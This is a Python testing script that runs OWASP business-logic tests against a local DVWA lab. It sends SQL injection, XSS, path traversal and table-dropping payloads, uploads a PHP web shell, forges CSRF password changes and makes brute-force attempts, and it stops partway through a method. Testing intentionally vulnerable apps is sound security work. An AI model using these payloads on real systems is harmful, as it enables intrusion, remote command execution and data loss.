import requests
from bs4 import BeautifulSoup
from datetime import datetime
import socket
import urllib.parse
from urllib.parse import urlparse
import argparse
import subprocess
import os
import random
import string
import time

class DVWATester:
    def __init__(self, base_url="http://localhost:8080", username="admin", password="password"):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.log_file = "dvwa_test_master_log.txt"
        self.security_level = "low"

    def write_log(self, entry: str):
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} | {entry}\n")

    def login(self):
        """Login to DVWA and set security level to low"""
        login_url = f"{self.base_url}/login.php"
        security_url = f"{self.base_url}/security.php"
        
        # Get login page and extract token
        resp = self.session.get(login_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        token = token_input['value'] if token_input else ''
        
        # Perform login
        data = {
            "username": self.username,
            "password": self.password,
            "Login": "Login",
            "user_token": token
        }
        login_resp = self.session.post(login_url, data=data)
        
        if "logout.php" in login_resp.text:
            self.write_log(f"[+] Login successful (Status: {login_resp.status_code})")
            
            # Set security level to low
            sec_resp = self.session.get(security_url)
            sec_soup = BeautifulSoup(sec_resp.text, 'html.parser')
            sec_token = sec_soup.find("input", {"name": "user_token"})['value']
            
            sec_data = {
                "security": "low",
                "seclev_submit": "Submit",
                "user_token": sec_token
            }
            self.session.post(security_url, data=sec_data)
            self.write_log("[+] Security level set to low")
            return True
        else:
            self.write_log(f"[-] Login failed (Status: {login_resp.status_code})")
            return False

    def OTG_BUSLOGIC_001(self):
        """Test Business Logic Data Validation"""
        self.write_log("----- Starting OTG-BUSLOGIC-001 (Business Logic Data Validation) -----")
        
        # Target URLs that might have business logic validation
        test_urls = [
            f"{self.base_url}/vulnerabilities/sqli/",
            f"{self.base_url}/vulnerabilities/brute/",
            f"{self.base_url}/vulnerabilities/upload/",
            f"{self.base_url}/vulnerabilities/captcha/"
        ]
        
        # Test cases for business logic validation
        test_cases = [
            # Numeric values that should have logical constraints
            {"name": "negative_price", "value": "-100", "expected": "should reject negative prices"},
            {"name": "zero_quantity", "value": "0", "expected": "should reject zero quantity"},
            {"name": "excessive_quantity", "value": "999999999", "expected": "should reject unrealistic quantities"},
            
            # String values that should have logical constraints
            {"name": "invalid_email", "value": "not-an-email", "expected": "should reject invalid email format"},
            {"name": "long_string", "value": "A"*500, "expected": "should reject excessively long inputs"},
            {"name": "sql_injection", "value": "' OR '1'='1", "expected": "should reject SQL injection attempts"},
            
            # Special cases
            {"name": "future_date", "value": "2050-01-01", "expected": "should reject future dates where not applicable"},
            {"name": "past_date", "value": "1990-01-01", "expected": "should reject dates too far in past"}
        ]
        
        for url in test_urls:
            self.write_log(f"\n[i] Testing URL: {url}")
            
            # Get the page to find forms
            resp = self.session.get(url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                self.write_log("  - No forms found on page")
                continue
                
            for form in forms:
                # Handle form action
                form_action = form.get('action')
                if not form_action or form_action == '#':
                    form_action = url
                else:
                    if not form_action.startswith(('http://', 'https://')):
                        form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{url}{form_action}"
                
                form_method = form.get('method', 'GET').upper()
                inputs = form.find_all('input')
                
                # Find all input parameters
                param_names = []
                for input_tag in inputs:
                    if input_tag.get('name') and input_tag.get('type') != 'hidden':
                        param_names.append(input_tag.get('name'))
                
                if not param_names:
                    self.write_log("  - No parameters found in form")
                    continue
                
                # Test each parameter with business logic test cases
                for param in param_names:
                    self.write_log(f"  - Testing parameter: {param}")
                    
                    for test_case in test_cases:
                        try:
                            # Prepare the payload data
                            data = {}
                            for inp in inputs:
                                name = inp.get('name')
                                value = inp.get('value', '')
                                if name == param:
                                    data[name] = test_case["value"]
                                elif name:
                                    data[name] = value
                            
                            # Send the request
                            if form_method == 'POST':
                                resp = self.session.post(form_action, data=data)
                            else:
                                resp = self.session.get(form_action, params=data)
                            
                            # Analyze response for business logic validation
                            self._check_business_logic_response(resp, test_case)
                        
                        except Exception as e:
                            self.write_log(f"    [x] Error testing with value '{test_case['value']}': {str(e)}")
                            continue
        
        self.write_log("----- OTG-BUSLOGIC-001 Test Completed -----\n")
    
    def _check_business_logic_response(self, resp, test_case):
        """Helper method to check responses for business logic validation failures"""
        if resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} with test case '{test_case['name']}'")
            return
            
        # Check for signs of successful business logic validation
        success_patterns = [
            ("error", "Possible validation error"),
            ("invalid", "Possible invalid data detected"),
            ("not allowed", "Possible restriction message"),
            ("try again", "Possible rejection message"),
            ("incorrect", "Possible validation failure")
        ]
        
        for pattern, message in success_patterns:
            if pattern.lower() in resp.text.lower():
                self.write_log(f"    [✓] {message} with test case '{test_case['name']}'")
                return
        
        # Check for error messages
        error_patterns = [
            "exception", "validation", "invalid", 
            "reject", "failed", "not acceptable"
        ]
        
        for error in error_patterns:
            if error.lower() in resp.text.lower():
                self.write_log(f"    [!] Possible validation failure - {error} detected with test case '{test_case['name']}'")
                return
        
        # Check if the invalid value was accepted
        if test_case["value"] in resp.text:
            self.write_log(f"    [✗] Business logic validation failed - invalid value '{test_case['value']}' was accepted")
        else:
            self.write_log(f"    [-] No obvious business logic validation failure with test case '{test_case['name']}'")


    def OTG_BUSLOGIC_002(self):
        """Test Ability to Forge Requests"""
        self.write_log("----- Starting OTG-BUSLOGIC-002 (Ability to Forge Requests) -----")
        
        # Target URLs in DVWA where request forgery might be possible
        test_urls = [
            f"{self.base_url}/vulnerabilities/csrf/",  # CSRF page might be vulnerable to forged requests
            f"{self.base_url}/vulnerabilities/sqli/",  # SQLi page might have hidden parameters
            f"{self.base_url}/vulnerabilities/brute/", # Login page might have hidden debug features
            f"{self.base_url}/vulnerabilities/exec/",  # Command execution might have hidden params
            f"{self.base_url}/vulnerabilities/upload/" # File upload might have hidden options
        ]
        
        # Common hidden/developer parameters to test
        hidden_parameters = [
            "debug", "test", "dev", "admin", "root",
            "enable", "disable", "verbose", "logging",
            "show", "hidden", "source", "internal"
        ]
        
        # Common parameter values that might enable hidden features
        toggle_values = [
            "true", "false", "1", "0", "yes", "no",
            "on", "off", "enable", "disable"
        ]
        
        for url in test_urls:
            self.write_log(f"\n[i] Testing URL: {url}")
            
            # First get the normal page to find existing parameters
            resp = self.session.get(url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                self.write_log("  - No forms found on page")
                # Test URL parameters directly
                self._test_forged_requests(url, {}, hidden_parameters, toggle_values)
                continue
                
            for form in forms:
                # Handle form action
                form_action = form.get('action')
                if not form_action or form_action == '#':
                    form_action = url
                else:
                    if not form_action.startswith(('http://', 'https://')):
                        form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{url}{form_action}"
                
                form_method = form.get('method', 'GET').upper()
                inputs = form.find_all('input')
                
                # Get all existing parameters
                existing_params = {}
                for input_tag in inputs:
                    if input_tag.get('name'):
                        existing_params[input_tag.get('name')] = input_tag.get('value', '')
                
                # Test with existing parameters plus forged ones
                self._test_forged_requests(form_action, existing_params, hidden_parameters, toggle_values, form_method)
        
        self.write_log("----- OTG-BUSLOGIC-002 Test Completed -----\n")

    def _test_forged_requests(self, url, existing_params, hidden_parameters, toggle_values, method="GET"):
        """Helper method to test forged requests with various parameters"""
        # Test 1: Add each hidden parameter with common toggle values
        for param in hidden_parameters:
            if param not in existing_params:  # Only test new parameters
                for value in toggle_values:
                    try:
                        test_params = existing_params.copy()
                        test_params[param] = value
                        
                        if method == "POST":
                            resp = self.session.post(url, data=test_params)
                        else:
                            resp = self.session.get(url, params=test_params)
                        
                        self._check_forged_response(resp, param, value)
                    
                    except Exception as e:
                        self.write_log(f"    [x] Error testing forged param '{param}={value}': {str(e)}")
        
        # Test 2: Modify existing numeric parameters with sequential/guessable values
        for param, original_value in existing_params.items():
            if original_value.isdigit():
                for i in range(-2, 3):  # Test values around the original
                    test_value = str(int(original_value) + i)
                    if test_value != original_value:  # Skip the original value
                        try:
                            test_params = existing_params.copy()
                            test_params[param] = test_value
                            
                            if method == "POST":
                                resp = self.session.post(url, data=test_params)
                            else:
                                resp = self.session.get(url, params=test_params)
                            
                            self._check_forged_response(resp, param, test_value)
                        
                        except Exception as e:
                            self.write_log(f"    [x] Error testing modified param '{param}={test_value}': {str(e)}")

    def _check_forged_response(self, resp, param, value):
        """Helper method to check responses for successful request forgery"""
        if resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} with forged param '{param}={value}'")
            return
            
        # Check for signs of successful request forgery
        success_patterns = [
            ("debug", "Possible debug mode enabled"),
            ("admin", "Possible admin access granted"),
            ("success", "Possible successful forged request"),
            ("verbose", "Possible verbose output enabled"),
            ("internal", "Possible internal information leaked"),
            ("hidden", "Possible hidden feature accessed")
        ]
        
        for pattern, message in success_patterns:
            if pattern.lower() in resp.text.lower():
                self.write_log(f"    [✓] {message} with forged param '{param}={value}'")
                return
        
        # Check for different responses that might indicate successful forgery
        if len(resp.text) > 1000:  # Arbitrary large response size
            self.write_log(f"    [!] Unusually large response with forged param '{param}={value}'")
        elif len(resp.text) < 50:   # Arbitrary small response size
            self.write_log(f"    [!] Unusually small response with forged param '{param}={value}'")
        elif "error" not in resp.text.lower() and "invalid" not in resp.text.lower():
            self.write_log(f"    [!] No error with forged param '{param}={value}' - possible successful forgery")
        else:
            self.write_log(f"    [-] No obvious success with forged param '{param}={value}'")


    def OTG_BUSLOGIC_003(self):
        """Test Integrity Checks"""
        self.write_log("----- Starting OTG-BUSLOGIC-003 (Integrity Checks) -----")
        
        # Target URLs in DVWA where integrity checks might be bypassed
        test_urls = [
            f"{self.base_url}/vulnerabilities/csrf/",      # CSRF page might have hidden fields
            f"{self.base_url}/vulnerabilities/upload/",    # Upload page might have hidden parameters
            f"{self.base_url}/vulnerabilities/sqli/",      # SQLi page might expose hidden fields
            f"{self.base_url}/vulnerabilities/captcha/",   # CAPTCHA might have client-side validation
            f"{self.base_url}/security.php"                # Security level page might have hidden params
        ]
        
        # Common hidden field names that might affect business logic
        hidden_fields = [
            "user_id", "user_level", "admin", "role", 
            "price", "quantity", "discount", "access_level",
            "security_level", "token", "auth", "privilege"
        ]
        
        # Values to test for privilege escalation
        privilege_values = [
            "admin", "root", "superuser", "1", "true",
            "high", "maximum", "privileged", "0", "false"
        ]
        
        for url in test_urls:
            self.write_log(f"\n[i] Testing URL: {url}")
            
            # Get the page to find forms and hidden fields
            resp = self.session.get(url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            if not forms:
                self.write_log("  - No forms found on page")
                continue
                
            for form in forms:
                # Handle form action
                form_action = form.get('action')
                if not form_action or form_action == '#':
                    form_action = url
                else:
                    if not form_action.startswith(('http://', 'https://')):
                        form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{url}{form_action}"
                
                form_method = form.get('method', 'GET').upper()
                inputs = form.find_all('input')
                
                # Get all parameters including hidden fields
                existing_params = {}
                hidden_params = []
                for input_tag in inputs:
                    if input_tag.get('name'):
                        existing_params[input_tag.get('name')] = input_tag.get('value', '')
                        if input_tag.get('type') == 'hidden':
                            hidden_params.append(input_tag.get('name'))
                
                # Test 1: Modify existing hidden fields
                if hidden_params:
                    self.write_log(f"  - Found hidden fields: {', '.join(hidden_params)}")
                    for param in hidden_params:
                        original_value = existing_params.get(param, '')
                        
                        # Try privilege escalation values
                        for value in privilege_values:
                            if str(value) != str(original_value):  # Skip original value
                                try:
                                    test_params = existing_params.copy()
                                    test_params[param] = value
                                    
                                    if form_method == 'POST':
                                        resp = self.session.post(form_action, data=test_params)
                                    else:
                                        resp = self.session.get(form_action, params=test_params)
                                    
                                    self._check_integrity_response(resp, param, value, original_value)
                                
                                except Exception as e:
                                    self.write_log(f"    [x] Error testing hidden field '{param}': {str(e)}")
                
                # Test 2: Add new hidden fields that might affect business logic
                for field in hidden_fields:
                    if field not in existing_params:  # Only test fields not already present
                        for value in privilege_values:
                            try:
                                test_params = existing_params.copy()
                                test_params[field] = value
                                
                                if form_method == 'POST':
                                    resp = self.session.post(form_action, data=test_params)
                                else:
                                    resp = self.session.get(form_action, params=test_params)
                                
                                self._check_integrity_response(resp, field, value, None)
                            
                            except Exception as e:
                                self.write_log(f"    [x] Error testing injected field '{field}': {str(e)}")
        
        self.write_log("----- OTG-BUSLOGIC-003 Test Completed -----\n")

    def _check_integrity_response(self, resp, param, test_value, original_value):
        """Helper method to check responses for integrity check failures"""
        if resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} when modifying '{param}' to '{test_value}'")
            return
            
        # Check for signs of successful integrity violation
        success_patterns = [
            ("admin", "Possible admin access granted"),
            ("privilege", "Possible privilege escalation"),
            ("success", "Possible successful integrity violation"),
            ("logged in", "Possible unauthorized access"),
            ("access granted", "Possible access control bypass")
        ]
        
        for pattern, message in success_patterns:
            if pattern.lower() in resp.text.lower():
                self.write_log(f"    [✓] {message} by modifying '{param}' to '{test_value}'")
                return
        
        # Check for different responses that might indicate successful violation
        if original_value is not None and str(original_value) in resp.text:
            self.write_log(f"    [-] Original value for '{param}' still in use (integrity maintained)")
        elif "error" not in resp.text.lower() and "invalid" not in resp.text.lower():
            self.write_log(f"    [!] No error when modifying '{param}' to '{test_value}' - possible integrity violation")
        else:
            self.write_log(f"    [-] Integrity check likely prevented modification of '{param}'")


    def OTG_BUSLOGIC_004(self):
        """Test for Process Timing"""
        self.write_log("----- Starting OTG-BUSLOGIC-004 (Process Timing) -----")
        
        # Target URLs in DVWA where timing differences might reveal information
        test_cases = [
            {
                "url": f"{self.base_url}/vulnerabilities/brute/",
                "params": {"username": "admin", "password": "wrongpass"},
                "description": "Valid username with wrong password"
            },
            {
                "url": f"{self.base_url}/vulnerabilities/brute/",
                "params": {"username": "invaliduser", "password": "wrongpass"},
                "description": "Invalid username with wrong password"
            },
            {
                "url": f"{self.base_url}/vulnerabilities/sqli/",
                "params": {"id": "1", "Submit": "Submit"},
                "description": "Valid SQL query"
            },
            {
                "url": f"{self.base_url}/vulnerabilities/sqli/",
                "params": {"id": "1' AND sleep(2)-- ", "Submit": "Submit"},
                "description": "Time-based SQL injection attempt"
            },
            {
                "url": f"{self.base_url}/login.php",
                "params": {"username": "admin", "password": "wrongpass", "Login": "Login"},
                "description": "Login page timing"
            }
        ]
        
        # Number of iterations to get average timing
        iterations = 5
        threshold = 0.5  # Seconds difference to consider significant
        
        for test_case in test_cases:
            self.write_log(f"\n[i] Testing URL: {test_case['url']}")
            self.write_log(f"  - Test case: {test_case['description']}")
            
            # Measure response time
            total_time = 0
            for i in range(iterations):
                try:
                    start_time = time.time()
                    resp = self.session.post(test_case["url"], data=test_case["params"])
                    elapsed = time.time() - start_time
                    total_time += elapsed
                    self.write_log(f"    - Request {i+1}: {elapsed:.3f} seconds")
                except Exception as e:
                    self.write_log(f"    [x] Error during timing test: {str(e)}")
                    continue
            
            if iterations > 0:
                avg_time = total_time / iterations
                self.write_log(f"  - Average time: {avg_time:.3f} seconds")
                
                # Store timing data for comparison
                if not hasattr(self, 'timing_data'):
                    self.timing_data = {}
                self.timing_data[test_case["description"]] = avg_time
        
        # Compare timing results
        if hasattr(self, 'timing_data') and len(self.timing_data) >= 2:
            self.write_log("\n[i] Timing comparison results:")
            comparisons = []
            
            # Get all test descriptions and their timings
            tests = list(self.timing_data.items())
            
            # Compare each test against others
            for i in range(len(tests)):
                for j in range(i+1, len(tests)):
                    desc1, time1 = tests[i]
                    desc2, time2 = tests[j]
                    diff = abs(time1 - time2)
                    comparisons.append((desc1, desc2, diff))
            
            # Sort by largest timing difference first
            comparisons.sort(key=lambda x: x[2], reverse=True)
            
            for desc1, desc2, diff in comparisons:
                if diff > threshold:
                    self.write_log(f"  [!] Significant timing difference ({diff:.3f}s) between:")
                    self.write_log(f"      - {desc1}")
                    self.write_log(f"      - {desc2}")
                else:
                    self.write_log(f"  [-] No significant timing difference ({diff:.3f}s) between:")
                    self.write_log(f"      - {desc1}")
                    self.write_log(f"      - {desc2}")
        
        self.write_log("----- OTG-BUSLOGIC-004 Test Completed -----\n")

    def _measure_response_time(self, url, params=None, method="GET"):
        """Helper method to measure response time for a request"""
        start_time = time.time()
        
        try:
            if method == "POST":
                resp = self.session.post(url, data=params)
            else:
                resp = self.session.get(url, params=params)
            
            elapsed = time.time() - start_time
            return elapsed, resp
        except Exception as e:
            return None, str(e)
    

    def OTG_BUSLOGIC_005(self):
        """Test Number of Times a Function Can be Used Limits"""
        self.write_log("----- Starting OTG-BUSLOGIC-005 (Function Usage Limits) -----")
        
        # DVWA components to test for function limits
        test_cases = [
            {
                "url": f"{self.base_url}/vulnerabilities/csrf/",
                "action": "password_change",
                "params": {"password_new": "test123", "password_conf": "test123", "Change": "Change"},
                "max_attempts": 1,
                "description": "Password change function (should be limited)"
            },
            {
                "url": f"{self.base_url}/security.php",
                "action": "security_level_change",
                "params": {"security": "high", "seclev_submit": "Submit"},
                "max_attempts": 3,  # DVWA typically allows multiple security level changes
                "description": "Security level change function"
            },
            {
                "url": f"{self.base_url}/vulnerabilities/captcha/",
                "action": "login_bypass",
                "params": {"user_token": "", "captcha": "12345", "Change": "Change"},
                "max_attempts": 5,
                "description": "CAPTCHA bypass attempts"
            }
        ]
        
        for test_case in test_cases:
            self.write_log(f"\n[i] Testing: {test_case['description']}")
            self.write_log(f"  - URL: {test_case['url']}")
            self.write_log(f"  - Max allowed attempts: {test_case['max_attempts']}")
            
            # First get any required tokens
            resp = self.session.get(test_case["url"])
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Update params with any tokens found
            final_params = test_case["params"].copy()
            token_input = soup.find("input", {"name": "user_token"})
            if token_input:
                final_params["user_token"] = token_input['value']
            
            # Test exceeding the limit by 2 additional attempts
            for attempt in range(1, test_case["max_attempts"] + 3):
                try:
                    if attempt == 1:
                        self.write_log("  - Testing initial allowed attempt")
                    elif attempt <= test_case["max_attempts"]:
                        self.write_log(f"  - Testing allowed attempt #{attempt}")
                    else:
                        self.write_log(f"  - Testing EXCESS attempt #{attempt} (beyond limit)")
                    
                    # Submit the request
                    resp = self.session.post(test_case["url"], data=final_params)
                    
                    # Check if the action was successful beyond the limit
                    if attempt > test_case["max_attempts"]:
                        if resp.status_code == 200:
                            if "success" in resp.text.lower():
                                self.write_log(f"    [✗] SUCCESSFUL execution on attempt #{attempt} - limit violation!")
                            else:
                                self.write_log(f"    [✓] Rejected on attempt #{attempt} (status {resp.status_code})")
                        else:
                            self.write_log(f"    [✓] Rejected with status {resp.status_code} on attempt #{attempt}")
                    
                    # Get new token if available for next attempt
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    new_token = soup.find("input", {"name": "user_token"})
                    if new_token:
                        final_params["user_token"] = new_token['value']
                    
                    # Small delay between attempts
                    time.sleep(1)
                    
                except Exception as e:
                    self.write_log(f"    [x] Error during attempt #{attempt}: {str(e)}")
                    break
        
        # Special test for brute force page (should have attempt limits)
        self._test_brute_force_limits()
        
        self.write_log("----- OTG-BUSLOGIC-005 Test Completed -----\n")

    def _test_brute_force_limits(self):
        """Special test for brute force page attempt limits"""
        self.write_log("\n[i] Testing brute force page attempt limits")
        brute_url = f"{self.base_url}/vulnerabilities/brute/"
        
        # First get the page and token
        resp = self.session.get(brute_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        token = soup.find("input", {"name": "user_token"})['value']
        
        # Test parameters
        test_params = {
            "username": "admin",
            "password": "wrongpassword",
            "Login": "Login",
            "user_token": token
        }
        
        max_allowed = 5  # Typical brute force limit
        for attempt in range(1, max_allowed + 3):
            try:
                if attempt <= max_allowed:
                    self.write_log(f"  - Testing brute force attempt #{attempt}")
                else:
                    self.write_log(f"  - Testing EXCESS brute attempt #{attempt}")
                
                resp = self.session.post(brute_url, data=test_params)
                
                # Check if we get blocked after max attempts
                if attempt > max_allowed:
                    if "blocked" in resp.text.lower() or "403" in resp.text:
                        self.write_log(f"    [✓] Account locked after {attempt-1} attempts")
                        break
                    else:
                        self.write_log(f"    [✗] Still allowed after {attempt} attempts!")
                
                # Update token for next attempt
                soup = BeautifulSoup(resp.text, 'html.parser')
                new_token = soup.find("input", {"name": "user_token"})
                if new_token:
                    test_params["user_token"] = new_token['value']
                
                time.sleep(1)
                
            except Exception as e:
                self.write_log(f"    [x] Error during brute attempt #{attempt}: {str(e)}")
                break


    def OTG_BUSLOGIC_006(self):
        """Testing for the Circumvention of Work Flows"""
        self.write_log("----- Starting OTG-BUSLOGIC-006 (Circumvention of Work Flows) -----")
        
        # Test workflow bypass in password change process
        self._test_password_change_workflow()
        
        # Test workflow bypass in security level change
        self._test_security_level_workflow()
        
        # Test workflow bypass in file upload process
        self._test_upload_workflow()
        
        self.write_log("----- OTG-BUSLOGIC-006 Test Completed -----\n")

    def _test_password_change_workflow(self):
        """Test bypassing password change workflow steps"""
        self.write_log("\n[i] Testing password change workflow circumvention")
        
        change_url = f"{self.base_url}/vulnerabilities/csrf/"
        
        try:
            # Get page and look for token
            resp = self.session.get(change_url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            token_input = soup.find("input", {"name": "user_token"})
            
            if token_input:  # If token exists (medium/high security)
                token = token_input['value']
                params = {
                    "password_new": "hacked123",
                    "password_conf": "hacked123",
                    "Change": "Change",
                    "user_token": token
                }
                resp = self.session.post(change_url, data=params)
                
                if "Password Changed" in resp.text:
                    self.write_log("  [✗] Successfully changed password with token!")
                else:
                    self.write_log("  [✓] Password change blocked despite having token")
            else:  # No token (low security)
                params = {
                    "password_new": "hacked123",
                    "password_conf": "hacked123",
                    "Change": "Change"
                }
                resp = self.session.post(change_url, data=params)
                
                if "Password Changed" in resp.text:
                    self.write_log("  [✗] Successfully changed password WITHOUT any CSRF token!")
                else:
                    self.write_log("  [✓] Password change blocked without token")
                    
        except Exception as e:
            self.write_log(f"  [x] Error testing password workflow: {str(e)}")

    def _test_security_level_workflow(self):
        """Test bypassing security level change workflow"""
        self.write_log("\n[i] Testing security level change workflow circumvention")
        
        security_url = f"{self.base_url}/security.php"
        
        try:
            # Step 1: Get current security level
            resp = self.session.get(security_url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            token = soup.find("input", {"name": "user_token"})['value']
            
            # Step 2: Attempt to set security level to impossible without proper steps
            params = {
                "security": "impossible",
                "seclev_submit": "Submit",
                "user_token": token
            }
            resp = self.session.post(security_url, data=params)
            
            if "Impossible" in resp.text:
                self.write_log("  [✗] Successfully set security to impossible without proper workflow!")
            else:
                self.write_log("  [✓] Security level change workflow enforced")
                
        except Exception as e:
            self.write_log(f"  [x] Error testing security workflow: {str(e)}")

    def _test_upload_workflow(self):
        """Test bypassing file upload workflow steps"""
        self.write_log("\n[i] Testing file upload workflow circumvention")
        
        upload_url = f"{self.base_url}/vulnerabilities/upload/"
        
        try:
            # Step 1: Directly POST upload without visiting upload page first
            files = {
                'uploaded': ('malicious.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
                'Upload': (None, 'Upload')
            }
            
            # Try without token first
            resp = self.session.post(upload_url, files=files)
            
            if "successfully uploaded" in resp.text.lower():
                self.write_log("  [✗] Successfully uploaded file without proper workflow!")
                return
            
            # Now try with token but skip file type checking
            resp = self.session.get(upload_url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            token = soup.find("input", {"name": "user_token"})['value']
            
            files['user_token'] = (None, token)
            resp = self.session.post(upload_url, files=files)
            
            if "successfully uploaded" in resp.text.lower():
                self.write_log("  [✗] Successfully uploaded malicious file bypassing checks!")
            else:
                self.write_log("  [✓] File upload workflow enforced")
                
        except Exception as e:
            self.write_log(f"  [x] Error testing upload workflow: {str(e)}")

    def _test_brute_force_workflow(self):
        """Test bypassing brute force protection workflow"""
        self.write_log("\n[i] Testing brute force protection workflow circumvention")
        
        brute_url = f"{self.base_url}/vulnerabilities/brute/"
        
        try:
            # Step 1: Get initial page and token
            resp = self.session.get(brute_url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            token = soup.find("input", {"name": "user_token"})['value']
            
            # Step 2: Attempt to bypass CAPTCHA by reusing token
            params = {
                "username": "admin",
                "password": "password",
                "Login": "Login",
                "user_token": token
            }
            
            for i in range(5):
                resp = self.session.post(brute_url, data=params)
                
                if "Welcome" in resp.text:
                    self.write_log(f"  [✗] Successfully bypassed brute force protection in attempt {i+1}!")
                    break
                elif i == 4:
                    self.write_log("  [✓] Brute force protection workflow enforced")
                    
                # Get new token but don't use it
                soup = BeautifulSoup(resp.text, 'html.parser')
                new_token = soup.find("input", {"name": "user_token"})
                if new_token:
                    token = new_token['value']
                
                time.sleep(1)
                
        except Exception as e:
            self.write_log(f"  [x] Error testing brute force workflow: {str(e)}")


    def OTG_BUSLOGIC_007(self):
        """Test Defenses Against Application Mis-use"""
        self.write_log("----- Starting OTG-BUSLOGIC-007 (Defenses Against Application Mis-use) -----")
        
        # Test 1: Rapid consecutive malicious requests
        self._test_rate_limiting()
        
        # Test 2: Multiple invalid input attempts
        self._test_input_monitoring()
        
        # Test 3: Session termination after suspicious activity
        self._test_session_termination()
        
        # Test 4: Monitoring for forced browsing
        self._test_forced_browsing()
        
        # Test 5: Geo/UA change detection
        self._test_geo_ua_detection()
        
        self.write_log("----- OTG-BUSLOGIC-007 Test Completed -----\n")

    def _test_rate_limiting(self):
        """Test if application detects and blocks rapid malicious requests"""
        self.write_log("\n[i] Testing rate limiting defenses")
        
        test_urls = [
            f"{self.base_url}/vulnerabilities/brute/",
            f"{self.base_url}/vulnerabilities/sqli/",
            f"{self.base_url}/vulnerabilities/exec/"
        ]
        
        for url in test_urls:
            try:
                # Get initial token if needed
                resp = self.session.get(url)
                soup = BeautifulSoup(resp.text, 'html.parser')
                token_input = soup.find("input", {"name": "user_token"})
                token = token_input['value'] if token_input else None
                
                # Prepare malicious payload
                params = {
                    "username": "admin' OR '1'='1",
                    "password": "password",
                    "Login": "Login"
                }
                if token:
                    params["user_token"] = token
                
                # Send 10 rapid requests
                blocked = False
                for i in range(1, 11):
                    start_time = time.time()
                    resp = self.session.post(url, data=params)
                    elapsed = time.time() - start_time
                    
                    if resp.status_code == 429 or "too many requests" in resp.text.lower():
                        self.write_log(f"  [✓] Rate limiting detected on {url} after {i} requests")
                        blocked = True
                        break
                    elif resp.status_code in [403, 503]:
                        self.write_log(f"  [✓] Request blocked on {url} after {i} requests")
                        blocked = True
                        break
                    
                    self.write_log(f"  - Request {i}: {resp.status_code} in {elapsed:.2f}s")
                    time.sleep(0.1)  # Small delay
                
                if not blocked:
                    self.write_log(f"  [✗] No rate limiting detected on {url} after 10 rapid requests")
                    
            except Exception as e:
                self.write_log(f"  [x] Error testing rate limiting: {str(e)}")

    def _test_input_monitoring(self):
        """Test if application detects multiple invalid input attempts"""
        self.write_log("\n[i] Testing input monitoring defenses")
        
        test_url = f"{self.base_url}/vulnerabilities/sqli/"
        payloads = [
            "' OR '1'='1",
            "1 AND 1=1",
            "1; DROP TABLE users",
            "<script>alert(1)</script>",
            "../../../etc/passwd"
        ]
        
        try:
            # Get initial token
            resp = self.session.get(test_url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            token_input = soup.find("input", {"name": "user_token"})
            token = token_input['value'] if token_input else None
            
            blocked = False
            for i, payload in enumerate(payloads, 1):
                params = {"id": payload, "Submit": "Submit"}
                if token:
                    params["user_token"] = token
                
                resp = self.session.get(test_url, params=params)
                
                if resp.status_code in [403, 503]:
                    self.write_log(f"  [✓] Input monitoring blocked request after {i} payloads")
                    blocked = True
                    break
                elif "blocked" in resp.text.lower():
                    self.write_log(f"  [✓] Input monitoring detected suspicious input after {i} payloads")
                    blocked = True
                    break
                
                self.write_log(f"  - Payload {i}: {resp.status_code}")
                time.sleep(0.5)
            
            if not blocked:
                self.write_log("  [✗] No input monitoring detected after multiple malicious payloads")
                
        except Exception as e:
            self.write_log(f"  [x] Error testing input monitoring: {str(e)}")

    def _test_session_termination(self):
        """Test if session gets terminated after suspicious activity"""
        self.write_log("\n[i] Testing session termination defenses")
        
        try:
            # First do normal activity
            resp = self.session.get(f"{self.base_url}/index.php")
            if "Login" in resp.text:
                self.write_log("  [✗] Session terminated prematurely")
                return
            
            # Now do suspicious activity
            for i in range(5):
                resp = self.session.get(f"{self.base_url}/vulnerabilities/sqli/?id=1' UNION SELECT 1,user()-- ")
                if "error" in resp.text.lower():
                    self.write_log(f"  - Suspicious request {i+1} returned error")
            
            # Check if still logged in
            resp = self.session.get(f"{self.base_url}/index.php")
            if "Login" in resp.text:
                self.write_log("  [✓] Session terminated after suspicious activity")
            else:
                self.write_log("  [✗] Session remained active after suspicious activity")
                
        except Exception as e:
            self.write_log(f"  [x] Error testing session termination: {str(e)}")

    def _test_forced_browsing(self):
        """Test if application detects forced browsing attempts"""
        self.write_log("\n[i] Testing forced browsing detection")
        
        test_urls = [
            f"{self.base_url}/config.inc.php",
            f"{self.base_url}/phpinfo.php",
            f"{self.base_url}/.git/HEAD",
            f"{self.base_url}/admin/"
        ]
        
        blocked = False
        for url in test_urls:
            try:
                resp = self.session.get(url)
                
                if resp.status_code in [403, 404]:
                    self.write_log(f"  - Access to {url} blocked: {resp.status_code}")
                elif resp.status_code == 200:
                    self.write_log(f"  [✗] Accessed protected resource: {url}")
                else:
                    self.write_log(f"  - {url} returned {resp.status_code}")
                    
                if resp.status_code == 403:
                    blocked = True
                    
            except Exception as e:
                self.write_log(f"  [x] Error testing {url}: {str(e)}")
        
        if blocked:
            self.write_log("  [✓] Some forced browsing attempts were blocked")
        else:
            self.write_log("  [✗] No forced browsing detection observed")

    def _test_geo_ua_detection(self):
        """Test if application detects geo/UA changes"""
        self.write_log("\n[i] Testing geo/UA change detection")
        
        try:
            # Initial request with normal UA
